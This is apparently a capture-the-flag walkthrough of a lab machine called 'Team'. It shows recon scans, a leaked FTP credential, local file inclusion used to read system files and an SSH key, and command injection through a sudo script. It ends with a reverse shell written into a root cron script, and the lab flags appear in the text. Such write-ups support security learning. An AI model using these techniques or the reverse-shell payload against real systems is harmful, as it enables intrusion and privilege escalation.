> Team

**export IP=10.10.186.114**

# Nmap

nmap -sC -sV -T4 -Pn -p- -vv -oN nmap/initial $IP

```
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
```

# Gobuster

sudo gobuster dir -u http://team.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,js,bin,cgi,zip -o gobuster/initial

```
/images (Status: 301)
/scripts (Status: 301)
/assets (Status: 301)
/robots.txt (Status: 200)
```

We can see somtheing in nmap result title. 

`<title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>`

Adding team.thm to our etc/hosts we can find a new site. Running gobuster again. Searching through robots.txt we got an entry `dale`. Looks like an username and we got ftp running. Why don't we try.

# Gobuster /scripts

sudo gobuster dir -u http://team.thm/scripts -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,js,bin,cgi,zip -o gobuster/scripts

```
script.txt
``` 

It has an interesting comment 

```
# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

We have a dead end. Let's try to fuzz for extensions using SecLists `extension-common.txt`. But didn't return anything. Let's try with `extensions-test.txt`, but we have to remove all `test.` strings to cut for fuzzing extensions.

sed s'/^test.//g' extensions-test.txt > extensions-test.txt

And now we can fuzz for the old file.

wfuzz -c -z file,extensions-test.txt --hc 404,400 http://team.thm/scripts/script.FUZZ

```
.old
.txt
```

Let's try to download `http://team.thm/scripts/script.old`. And we have ftp user and password.

## FTP user

`ftpuser`:`T3@m$h@r3`

Logging in as ftpuser we got `New_site.txt`. 

```
Dale
	I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles
```

Let's add dev.team.thm to our /etc/hosts. It prompts us a link `Place holder link to team share`.

Clicking the link we got url `http://dev.team.thm/script.php?page=teamshare.php`. Let's try for LFI `http://dev.team.thm/script.php?page=../../../../../../../../etc/passwd` and we got response.

Accessing `http://dev.team.thm/script.php?page=../../../../../../../../home/dale/user.txt` we can get user.txt

# user.txt

```
THM{6Y0TXHz7c2d}
```

We can try search for `sshd_config`. And we can find id_rsa in `view-source:http://dev.team.thm/script.php?page=../../../../../../../../etc/ssh/sshd_config`.

ssh -i id_rsa dale@$IP => We are in as dale.

sudo -l

```
User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

/home/gyles/admin_checks

```
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null => looks like it acccepts all user entries

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

sudo -u gyles /home/gyles/admin_checks

```
Reading stats.
Reading stats..
Enter name of person backing up the data: no
Enter 'date' to timestamp the file: bash
The Date is id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
```

We are in as gyles.

## admin_checks 

```
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

Looking at .bash_history of gyles we can find /opt/admin_stuff.

## /opt/admin_stuff/script.sh 

```
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```

We can look at the scripts.

```
ls -l /usr/local/sbin/dev_backup.sh
-rwxr-xr-x 1 root root 64 Jan 17 19:42 /usr/local/sbin/dev_backup.sh
ls -l /usr/local/bin/main_backup.sh
-rwxrwxr-x 1 root admin 65 Jan 17 20:36 /usr/local/bin/main_backup.sh
```

# Privilege Escalation

echo "bash -i >& /dev/tcp/10.9.X.X/1234 0>&1" > /usr/local/bin/main_backup.sh

# root.txt

```
THM{fhqbznavfonq}
```